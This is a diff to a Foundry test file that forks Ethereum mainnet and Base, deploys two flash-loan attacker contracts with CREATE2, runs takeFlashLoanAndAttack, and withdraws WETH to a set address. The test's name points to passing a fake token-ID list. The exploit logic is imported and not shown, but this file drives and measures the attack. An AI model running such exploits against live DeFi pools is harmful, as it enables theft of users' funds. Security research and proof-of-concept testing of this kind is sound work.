@@ -2,44 +2,35 @@
 pragma solidity ^0.8.13;
 
 import "forge-std/Test.sol";
-import "./Attacker.sol"; // Adjust path to your Attacker contract
+import {USDC_WETH30bpsMainnetAttacker} from "./USDC_WETH30bpsMainnetAttacker.sol";
+import {ETH_USDC5bpsBaseAttacker} from "./ETH_USDC5bpsBaseAttacker.sol";
+import {IERC20Partial} from "./Interfaces.sol";
 
 contract MakingFakeTokenIdListPassTest is Test {
-    Attacker template;
-    Attacker attacker;
 
-    function setUp() public {
-        // Fork mainnet at a specific block if needed
-        // vm.createSelectFork("mainnet", BLOCK_NUMBER);
+    function setUp() public {}
 
-        // Or just fork latest mainnet
+    address withdrawer = address(0x777);
+
+    function testTakeFlashLoanAndAttack_USDC_WETH30bpsMainnetAttacker() public {
         vm.createSelectFork("mainnet");
 
-        // Deploy with CREATE2 for deterministic address
         bytes32 salt = bytes32(uint256(0x123));
-        attacker = new Attacker{salt: salt}();
-
+        USDC_WETH30bpsMainnetAttacker attacker = new USDC_WETH30bpsMainnetAttacker{salt: salt}(withdrawer);
         console.log("Attacker deployed at:", address(attacker));
-
-        // Fund the attacker with initial capital if needed
-        // You might need some initial USDC/WETH to pay for flash loan fees
-        /* deal(USDC, address(attacker), 1000e6); // 1000 USDC for fees */
-        /* deal(WETH, address(attacker), 1e18);   // 1 WETH for fees */
+        attacker.takeFlashLoanAndAttack();
+        IERC20Partial WETH = IERC20Partial(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
+        console.log("balance before withdraw", WETH.balanceOf(withdrawer));
+        vm.prank(withdrawer);
+        attacker.withdraw(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, 100000000001);
+        console.log("balance after withdraw", WETH.balanceOf(withdrawer));
     }
 
-    function testTakeFlashLoanAndAttack() public {
-        // Run the attack
-        attacker.takeFlashLoanAndAttack();
+    function testTakeFlashLoanAndAttack_ETH_USDC5bpsBaseAttacker() public {
+        vm.createSelectFork("base");
 
-        // Add assertions here if you want to verify specific outcomes
-        // For example:
-        // assertGt(IERC20(USDC).balanceOf(address(attacker)), 1000e6, "Attack should be profitable");
-    }
-
-    // Alternative: if you want to run it without the test prefix for debugging
-    function testAttackExecution() public {
-        console.log("Starting attack simulation...");
+        bytes32 salt = bytes32(uint256(0x123));
+        ETH_USDC5bpsBaseAttacker attacker = new ETH_USDC5bpsBaseAttacker{salt: salt}();
         attacker.takeFlashLoanAndAttack();
-        console.log("Attack completed");
     }
 }
